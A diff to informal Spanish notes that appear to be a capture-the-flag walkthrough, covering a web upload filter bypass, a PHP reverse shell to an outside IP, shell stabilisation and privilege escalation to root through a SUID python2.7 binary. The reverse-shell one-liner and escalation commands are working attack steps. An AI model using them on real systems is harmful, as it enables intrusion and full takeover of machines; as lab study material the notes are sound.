@@ -9,3 +9,17 @@
 - echo "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.173.148/4545 0>&1'"); ?>" > file.php ->  PHP não é permitido!
 - probamos a modificar extension -> mv file.php file.php5-> me deja :)
 - /usr/share/webshells/php/php-reverse-shell.php -> pillamos la shell modificamos y cambiamos a .php5
+- pillamos una shell -> estabilizamos ->
+- script /dev/null -c bash
+-  ctrl + z -
+-  ssty raw -echo; fg
+-  reset xterm
+-  export TERM=xterm
+-  export SHELL=bash
+-  whoami
+-  www-data@ip-10-128-166-119:/var/www$ cat user.txt
+-  ahora a escalar privilegios :)
+-  sudo -l no tenemos pw
+-  find / -perm -4000 -type f 2>/dev/null -> /usr/bin/python2.7 cualquiera puede ejecutar python2.7 WTF...
+-  /usr/bin/python2.7 -c 'print("hola")' en efecto podemos ejecutar -> procedo a lanzar comando libreria system pues que tenga bash -p
+-  /usr/bin/python2.7 -c 'import os; os.execl("/bin/bash","bash","-p")' -> whoami -> Root :) :))
